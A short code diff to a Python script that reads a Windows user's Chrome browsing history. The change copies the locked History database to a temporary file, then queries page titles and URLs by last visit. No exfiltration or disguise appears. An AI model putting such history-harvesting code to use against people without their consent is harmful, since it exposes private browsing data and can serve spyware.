@@ -1,6 +1,7 @@
 import os
 import re
 from pathlib import Path
+from shutil import copyfile
 from time import sleep
 from random import randrange
 import sqlite3
@@ -41,7 +42,9 @@ def get_chrome_history(user_path):
     while not urls:
         try:
             history_path = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"
-            connection = sqlite3.connect(history_path)
+            temp_history = history_path + "temp"
+            copyfile(history_path,temp_history)
+            connection = sqlite3.connect(temp_history)
             cursor = connection.cursor()
             cursor.execute("SELECT title, url FROM urls ORDER BY last_visit_time DESC")
             urls = cursor.fetchall()
